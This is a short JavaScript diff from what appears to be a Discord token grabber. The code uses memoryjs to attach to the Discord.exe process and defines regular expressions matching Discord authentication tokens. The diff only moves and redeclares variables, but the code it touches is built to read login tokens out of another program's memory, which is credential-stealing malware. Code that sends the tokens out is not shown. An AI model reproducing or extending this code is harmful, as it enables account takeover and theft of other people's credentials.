@@ -1,9 +1,8 @@
 const memoryjs = require("memoryjs");
 
-const processName = "Discord.exe";
-const processes = memoryjs.getProcesses();
-
 let token = "";
+let processName = "Discord.exe";
+let processes = memoryjs.getProcesses();
 
 let firstCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{38}/g);
 let secondCheck = new RegExp(/ODk[a-zA-Z0-9]{21}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9-_]{107}/g);
